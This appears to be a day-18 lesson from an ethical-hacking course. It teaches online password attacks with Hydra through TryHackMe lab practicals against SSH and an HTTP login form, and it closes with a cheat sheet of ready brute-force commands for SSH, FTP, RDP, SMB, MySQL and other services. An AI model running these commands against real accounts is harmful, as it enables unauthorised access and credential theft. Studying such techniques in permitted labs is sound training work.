# Day 18 — Exploitation: Password Attacks with Hydra

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 17 — Server-Side & Client-Side Attacks](#) | Next: [Day 19](#)

---

## 📋 Table of Contents

1. [Types of Password Attacks](#1-types-of-password-attacks)
2. [Password Attack Techniques](#2-password-attack-techniques)
3. [Tool: Hydra](#3-tool-hydra)
4. [Practical 1: SSH Brute Force](#4-practical-1-ssh-brute-force)
5. [Practical 2: HTTP Login Form Brute Force](#5-practical-2-http-login-form-brute-force)
6. [Hydra Flag Reference](#6-hydra-flag-reference)
7. [Quick Reference Cheat Sheet](#7-quick-reference-cheat-sheet)

---

## 1. Types of Password Attacks

| Type | Description | Example |
|------|-------------|---------|
| **Online** | Attack a live, active service over the network | Brute-forcing SSH, HTTP login form |
| **Offline** | Crack password hashes obtained from a compromised system locally | Cracking `/etc/shadow` hashes with John or Hashcat |

**Online Password Attack:**
```
[Attacker] ──tries passwords──▶ [Live SSH / HTTP / FTP Service]
                                  (service is running and responding)
```

**Offline Password Attack:**
```
[Attacker] ──dumps hashes──▶ [Cracking tool: John / Hashcat]
                               (works locally, no network needed)
```

> 💡 This video covers **Online** password attacks. Offline hash cracking is a separate topic.

---

## 2. Password Attack Techniques

### 1. Simple Brute Force

Try **every possible combination** of characters until the correct password is found.

**Example:** 4-digit PIN → 0000 to 9999 = 10,000 combinations

**Pros:** Guaranteed to find the password eventually  
**Cons:** Extremely slow for long/complex passwords; most services lock accounts after failed attempts

**Why it's often not feasible:**
- Rate limiting (too many requests → blocked)
- Account lockout after N failed attempts
- CAPTCHA protection
- IP banning

---

### 2. Dictionary Attack ⭐ Most Common

Use a **wordlist** of common passwords and phrases instead of every combination.

**Why it works:** People tend to use memorable, dictionary-based words as passwords (e.g., `monkey`, `password123`, `sunshine`, `butterfly`)

**Common wordlists:**
- `rockyou.txt` — 14 million real leaked passwords
- `common.txt` — common service-specific passwords
- Custom wordlists based on OSINT (company name + numbers, etc.)

---

### 3. Hybrid Attack

Combines **dictionary + brute force** — takes a dictionary word and appends brute-forced characters.

**Example:**
- Company: Bajaj Finance
- Employees likely use: `bajaj` + employee ID number
- Attack: dictionary word `bajaj` + brute force `0001` to `9999`
- Result: `bajaj1234`, `bajaj5678`, etc.

**When to use:** When you know part of the password pattern from OSINT (company name, username format, etc.)

---

### 4. Credential Stuffing

Uses **previously leaked credentials** from data breaches to try on other services.

**How it works:**
1. A service (e.g., LinkedIn) gets breached
2. Email/password combinations are leaked online
3. Attacker tries those same credentials on other services (Amazon, Gmail, banking)
4. Works because people **reuse passwords** across services

**Why it's effective:** Most users reuse the same password across multiple sites.

---

## 3. Tool: Hydra

**Hydra** is a fast, parallelized online password brute forcing tool — pre-installed on Kali Linux.

**Supported services:**
FTP, SSH, HTTP (GET/POST), HTTPS, SMB, MySQL, MSSQL, PostgreSQL, RDP, VNC, LDAP, IRC, IMAP, SMTP, Telnet, and many more.

### Installation

```bash
# Pre-installed on Kali Linux
hydra -h      # verify it's available

# Install on other systems:
sudo apt install hydra
```

### Basic syntax

```bash
hydra -l <username> -P <wordlist> <protocol>://<target-ip>
```

---

## 4. Practical 1: SSH Brute Force

**Target:** TryHackMe machine  
**Known info:** Username = `molly`, Password = unknown

### Step 1: Scan for open ports

```bash
nmap <target-ip>
```

**Output:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Step 2: Run Hydra against SSH

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

**Flag explanation:**

| Flag | Value | Meaning |
|------|-------|---------|
| `-l` | `molly` | Single known username (lowercase L) |
| `-P` | `/usr/share/wordlists/rockyou.txt` | Password wordlist (uppercase P) |
| `ssh://` | `<target-ip>` | Service and target |

### Step 3: Result

```
[22][ssh] host: <target-ip>   login: molly   password: butterfly
```

✅ **Password found: `butterfly`**

### Step 4: Verify by logging in

```bash
ssh molly@<target-ip>
# Enter password: butterfly
```

---

## 5. Practical 2: HTTP Login Form Brute Force

**Target:** HTTP login portal on port 80  
**Known info:** Username = `molly`, Password = unknown

### Step 1: Inspect the login form with Burp Suite

**Setup:**
1. Enable FoxyProxy → select Burp Suite
2. Turn Intercept ON in Burp Suite
3. Submit a test login (e.g., username: `molly`, password: `test`)
4. Capture the request in Burp Suite

**What to note from the intercepted request:**

```
POST /login HTTP/1.1
Host: <target-ip>
...

username=molly&password=test
```

**Three things to extract:**

| Info | Value from Burp |
|------|----------------|
| **Request type** | `POST` |
| **Endpoint** | `/login` |
| **Parameter names** | `username` and `password` |

### Step 2: Identify the failure message

Submit a wrong password and note the error response:
```
Your username or password is incorrect.
```

This is used by Hydra to detect failed attempts.

### Step 3: Build the Hydra command

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt \
  <target-ip> \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:Your username or password is incorrect" \
  -V
```

**Full breakdown of every part:**

| Part | Meaning |
|------|---------|
| `hydra` | Launch Hydra |
| `-l molly` | Known username (single) |
| `-P /usr/share/wordlists/rockyou.txt` | Password wordlist |
| `<target-ip>` | Target IP address |
| `http-post-form` | Protocol = HTTP, method = POST, type = form |
| `"/login` | The endpoint where login form submits |
| `username=^USER^` | Parameter name for username + Hydra placeholder |
| `&password=^PASS^` | Parameter name for password + Hydra placeholder |
| `:Your username or password is incorrect"` | Failure message — Hydra skips if this appears |
| `-V` | Verbose — show each attempt |

### Step 4: Result

```
[80][http-post-form] host: <target-ip>   login: molly   password: sunshine
```

✅ **Password found: `sunshine`**

### Step 5: Verify by logging in

Open browser → go to `http://<target-ip>/login`  
Username: `molly` | Password: `sunshine` → ✅ Logged in successfully

---

## 6. Hydra Flag Reference

### Username / Password flags

| Flag | Meaning | Use when |
|------|---------|----------|
| `-l <username>` | Single known username | You know the exact username |
| `-L <file>` | Username wordlist | You don't know the username |
| `-p <password>` | Single known password | You know the password, need to find username |
| `-P <file>` | Password wordlist | You need to brute force the password |

**Decision table:**

```
Know username? → -l molly
Don't know username? → -L /path/to/userlist.txt

Know password? → -p sunshine
Don't know password? → -P /path/to/wordlist.txt
```

### General flags

| Flag | Meaning |
|------|---------|
| `-V` | Verbose — show every attempt |
| `-v` | Slightly less verbose |
| `-t <N>` | Number of parallel threads (default: 16) |
| `-s <port>` | Specify custom port |
| `-o <file>` | Save output to file |
| `-f` | Stop after first valid password found |
| `-u` | Loop around users, not passwords |
| `-e nsr` | Try: n=null, s=same-as-login, r=reversed |

### Service syntax examples

```bash
# SSH
hydra -l user -P wordlist.txt ssh://192.168.1.10

# SSH on custom port
hydra -l user -P wordlist.txt -s 2222 ssh://192.168.1.10

# FTP
hydra -l user -P wordlist.txt ftp://192.168.1.10

# HTTP GET form
hydra -l user -P wordlist.txt http-get-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTP POST form
hydra -l user -P wordlist.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Failure message"

# HTTPS POST form
hydra -l user -P wordlist.txt 192.168.1.10 https-post-form \
  "/login:username=^USER^&password=^PASS^:Failure message"

# MySQL
hydra -l root -P wordlist.txt mysql://192.168.1.10

# RDP
hydra -l administrator -P wordlist.txt rdp://192.168.1.10

# SMB
hydra -l user -P wordlist.txt smb://192.168.1.10

# Telnet
hydra -l user -P wordlist.txt telnet://192.168.1.10
```

---

## 7. Quick Reference Cheat Sheet

### SSH Brute Force
```bash
hydra -l <username> -P <wordlist> ssh://<target-ip>

# Example:
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

### HTTP Login Form Brute Force

**Step 1: Intercept login with Burp Suite — note:**
- Request type (POST / GET)
- Endpoint (e.g., `/login`)
- Parameter names (e.g., `username`, `password`)
- Failure message (e.g., `Your username or password is incorrect`)

**Step 2: Build command:**
```bash
hydra -l <user> -P <wordlist> <target-ip> http-post-form \
  "/<endpoint>:<param1>=^USER^&<param2>=^PASS^:<failure-message>" -V
```

**Example:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 \
  http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect" -V
```

### Hydra Placeholders
```
^USER^  → replaced with username from -l or -L
^PASS^  → replaced with password from -p or -P
```

### http-post-form Syntax
```
"/<endpoint>:<parameters>:<failure-string>"

Example:
"/login:username=^USER^&password=^PASS^:Invalid credentials"
  │       │                              │
  │       └── form parameters            └── failure keyword
  └── URL endpoint
```

### Common Wordlists (Kali Linux)
```bash
/usr/share/wordlists/rockyou.txt                  # 14M leaked passwords
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Usernames/Names/names.txt
```

### Attack Type Decision Guide
```
Know username, need password:
  hydra -l <user> -P <wordlist> <service>://<ip>

Don't know username OR password:
  hydra -L <userlist> -P <wordlist> <service>://<ip>

Know password, need username:
  hydra -L <userlist> -p <password> <service>://<ip>
```

---

> ✅ **End of Day 18 Notes**  
> 📌 Next up: More exploitation techniques  
> 💡 Practice: Set up a TryHackMe room with SSH + HTTP login and use Hydra against it  
> ⚠️ Only attack services you own or have explicit permission to test  
> 💬 Questions? Drop them in the comments!